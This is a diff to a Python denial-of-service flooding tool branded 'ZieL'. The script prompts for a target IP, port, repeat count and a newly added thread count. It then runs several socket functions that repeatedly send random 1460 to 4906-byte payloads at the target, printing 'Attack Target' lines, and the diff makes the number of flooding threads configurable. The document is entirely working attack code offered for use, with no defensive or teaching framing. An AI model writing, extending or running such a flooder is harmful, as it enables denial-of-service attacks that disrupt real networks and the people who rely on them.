@@ -85,6 +85,8 @@ print("""\033[31m╔═[\033[34mZieL - Port\033[31m]""")
 port = int(input("\033[31m╚════> \033[34m"))
 print("""\033[31m╔═[\033[34mZieL - Times\033[31m]""")
 times = int(input("\033[31m╚════> \033[34m"))
+print("""\033[31m╔═[\033[34mZieL - Threads\033[31m]""")
+threads = int(input("\033[31m╚════> \033[34m"))
 print("""\033[31m╔═[\033[34mZieL - Ready? \033[37m(\033[32my/\033[31mn\033[37m) \033[31m]""")
 ready = str(input("\033[31m╚════> \033[34m"))
 if ready == 'n':
@@ -99,9 +101,9 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-				print(f"\033[31m[\033[37m+\033[31m] \033[37mAttack Target: \033[31m{ip}, \033[37mPort: \033[31m{port}, \033[37mTimes: \033[31m{times}.")
+				print(f"\033[31m[\033[37m+\033[31m] \033[37mAttack Target: \033[31m{ip}, \033[37mPort: \033[31m{port}, \033[37mTimes: \033[31m{times}, \033[37mThreads: \033[31m{threads}.")
 		except:
-				print(f"\033[31m[\033[37m+\033[31m] \033[37mAttack Target: \033[31m{ip}, \033[37mPort: \033[31m{port}, \033[37mTimes: \033[31m{times}.")
+				print(f"\033[31m[\033[37m+\033[31m] \033[37mAttack Target: \033[31m{ip}, \033[37mPort: \033[31m{port}, \033[37mTimes: \033[31m{times}, \033[37mThreads: \033[31m{threads}.")
 				
 def run2():
 	data = random._urandom(4096)
@@ -112,10 +114,10 @@ def run2():
 					s.sendto(data,addr)
 					for x in range(times):
 						s.send(data)
-						print(f"\033[31m[\033[37m+\033[31m] \033[37mAttack Target: \033[31m{ip}, \033[37mPort: \033[31m{port}, \033[37mTimes: \033[31m{times}.")
+						print(f"\033[31m[\033[37m+\033[31m] \033[37mAttack Target: \033[31m{ip}, \033[37mPort: \033[31m{port}, \033[37mTimes: \033[31m{times}, \033[37mThreads: \033[31m{threads}.")
 				except:
 					s.close()
-				print(f"\033[31m[\033[37m+\033[31m] \033[37mAttack Target: \033[31m{ip}, \033[37mPort: \033[31m{port}, \033[37mTimes: \033[31m{times}.")
+				print(f"\033[31m[\033[37m+\033[31m] \033[37mAttack Target: \033[31m{ip}, \033[37mPort: \033[31m{port}, \033[37mTimes: \033[31m{times}, \033[37mThreads: \033[31m{threads}.")
 				
 def run3():
 	data = random._urandom(2048)
@@ -125,10 +127,10 @@ def run3():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-				print(f"\033[31m[\033[37m+\033[31m] \033[37mAttack Target: \033[31m{ip}, \033[37mPort: \033[31m{port}, \033[37mTimes: \033[31m{times}.")
+				print(f"\033[31m[\033[37m+\033[31m] \033[37mAttack Target: \033[31m{ip}, \033[37mPort: \033[31m{port}, \033[37mTimes: \033[31m{times}, \033[37mThreads: \033[31m{threads}.")
 		except:
 				s.close()
-				print(f"\033[31m[\033[37m+\033[31m] \033[37mAttack Target: \033[31m{ip}, \033[37mPort: \033[31m{port}, \033[37mTimes: \033[31m{times}.")
+				print(f"\033[31m[\033[37m+\033[31m] \033[37mAttack Target: \033[31m{ip}, \033[37mPort: \033[31m{port}, \033[37mTimes: \033[31m{times}, \033[37mThreads: \033[31m{threads}.")
 				
 def run4():
 	data = random._urandom(1460)
@@ -138,10 +140,10 @@ def run4():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-				print(f"\033[31m[\033[37m+\033[31m] \033[37mAttack Target: \033[31m{ip}, \033[37mPort: \033[31m{port}, \033[37mTimes: \033[31m{times}.")
+				print(f"\033[31m[\033[37m+\033[31m] \033[37mAttack Target: \033[31m{ip}, \033[37mPort: \033[31m{port}, \033[37mTimes: \033[31m{times}, \033[37mThreads: \033[31m{threads}.")
 		except:
 				s.close()
-				print(f"\033[31m[\033[37m+\033[31m] \033[37mAttack Target: \033[31m{ip}, \033[37mPort: \033[31m{port}, \033[37mTimes: \033[31m{times}.")
+				print(f"\033[31m[\033[37m+\033[31m] \033[37mAttack Target: \033[31m{ip}, \033[37mPort: \033[31m{port}, \033[37mTimes: \033[31m{times}, \033[37mThreads: \033[31m{threads}.")
 				
 def run5():
 	data = random._urandom(4906)
@@ -151,10 +153,10 @@ def run5():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-				print(f"\033[31m[\033[37m+\033[31m] \033[37mAttack Target: \033[31m{ip}, \033[37mPort: \033[31m{port}, \033[37mTimes: \033[31m{times}.")
+				print(f"\033[31m[\033[37m+\033[31m] \033[37mAttack Target: \033[31m{ip}, \033[37mPort: \033[31m{port}, \033[37mTimes: \033[31m{times}, \033[37mThreads: \033[31m{threads}.")
 		except:
 				s.close()
-				print(f"\033[31m[\033[37m+\033[31m] \033[37mAttack Target: \033[31m{ip}, \033[37mPort: \033[31m{port}, \033[37mTimes: \033[31m{times}.")
+				print(f"\033[31m[\033[37m+\033[31m] \033[37mAttack Target: \033[31m{ip}, \033[37mPort: \033[31m{port}, \033[37mTimes: \033[31m{times}, \033[37mThreads: \033[31m{threads}.")
 				
 def run6():
 	data = random._urandom(2048)
@@ -164,10 +166,10 @@ def run6():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-				print(f"\033[31m[\033[37m+\033[31m] \033[37mAttack Target: \033[31m{ip}, \033[37mPort: \033[31m{port}, \033[37mTimes: \033[31m{times}.")
+				print(f"\033[31m[\033[37m+\033[31m] \033[37mAttack Target: \033[31m{ip}, \033[37mPort: \033[31m{port}, \033[37mTimes: \033[31m{times}, \033[37mThreads: \033[31m{threads}.")
 		except:
 				s.close()
-				print(f"\033[31m[\033[37m+\033[31m] \033[37mAttack Target: \033[31m{ip}, \033[37mPort: \033[31m{port}, \033[37mTimes: \033[31m{times}.")
+				print(f"\033[31m[\033[37m+\033[31m] \033[37mAttack Target: \033[31m{ip}, \033[37mPort: \033[31m{port}, \033[37mTimes: \033[31m{times}, \033[37mThreads: \033[31m{threads}.")
 				
 def run7():
 	data = random._urandom(4906)
@@ -178,12 +180,12 @@ def run7():
 					s.send(data)
 					for x in range(times):
 						s.send(data)
-						print(f"\033[31m[\033[37m+\033[31m] \033[37mAttack Target: \033[31m{ip}, \033[37mPort: \033[31m{port}, \033[37mTimes: \033[31m{times}.")
+						print(f"\033[31m[\033[37m+\033[31m] \033[37mAttack Target: \033[31m{ip}, \033[37mPort: \033[31m{port}, \033[37mTimes: \033[31m{times}, \033[37mThreads: \033[31m{threads}.")
 				except:
 					s.close
-				print(f"\033[31m[\033[37m+\033[31m] \033[37mAttack Target: \033[31m{ip}, \033[37mPort: \033[31m{port}, \033[37mTimes: \033[31m{times}.")
+				print(f"\033[31m[\033[37m+\033[31m] \033[37mAttack Target: \033[31m{ip}, \033[37mPort: \033[31m{port}, \033[37mTimes: \033[31m{times}, \033[37mThreads: \033[31m{threads}.")
 				
-for y in range(times):
+for y in range(threads):
 	if ready == 'y':
 		th = threading.Thread(target = run)
 		th.start()
